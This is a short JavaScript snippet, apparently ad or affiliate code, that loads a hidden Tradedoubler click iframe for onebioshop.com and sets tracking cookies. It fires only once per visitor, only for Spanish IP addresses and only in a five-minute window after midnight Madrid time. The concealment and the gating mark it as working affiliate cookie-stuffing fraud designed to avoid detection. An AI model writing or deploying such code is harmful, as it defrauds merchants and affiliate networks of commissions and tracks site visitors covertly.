
(function () {
  try {
    var BUILD_ID = "octaads-2025-rtg-geo-time-03";
    if (window.__OCTAADS_LOADED === BUILD_ID) return;
    window.__OCTAADS_LOADED = BUILD_ID;

    /* ===============================
       RUN ONLY ONCE PER USER
    =============================== */
    if (localStorage.getItem("fired") === "1") return;

    /* ===============================
       SPAIN TIME CHECK: 12:20 AM – 12:25 AM
    =============================== */
    function isAllowedSpainTime() {
      var now = new Date(
        new Date().toLocaleString("en-US", { timeZone: "Europe/Madrid" })
      );

      var minutes = now.getHours() * 60 + now.getMinutes();

      // 12:20 AM = 00:20 = 20 minutes
      // 12:25 AM = 00:25 = 25 minutes
      return minutes >= 20 && minutes <= 25;
    }

    if (!isAllowedSpainTime()) return;

    /* ===============================
       SESSION ID
    =============================== */
    function getSessionID() {
      var m = document.cookie.match(/octaads_sid=([^;]+)/);
      if (m) return m[1];

      var sid = "sid_" + Math.random().toString(36).substr(2, 10);
      document.cookie =
        "octaads_sid=" + sid +
        "; path=/; max-age=2592000; SameSite=Lax";
      return sid;
    }

    var sessionID = getSessionID();

    /* ===============================
       GEO CHECK – SPAIN ONLY
    =============================== */
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then(r => r.json())
      .then(geo => {
        if (!geo) return;
        if (geo.country_code !== "ES") return;

        /* Mark as fired – prevents future clicks */
        localStorage.setItem("fired", "1");

        function setCookie(n, v) {
          document.cookie =
            n + "=" + v + "; path=/; max-age=2592000; SameSite=Lax";
        }

        setCookie("tduid", sessionID);
        setCookie("clickId", sessionID);

        var iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        iframe.src =
          "https://clk.tradedoubler.com/click" +
          "?p=382651&a=3421038&epi=98076&url=onebioshop.com" +
          "&tduid=" + encodeURIComponent(sessionID);

        document.body.appendChild(iframe);
      })
      .catch(function () {});

  } catch (e) {}
})();

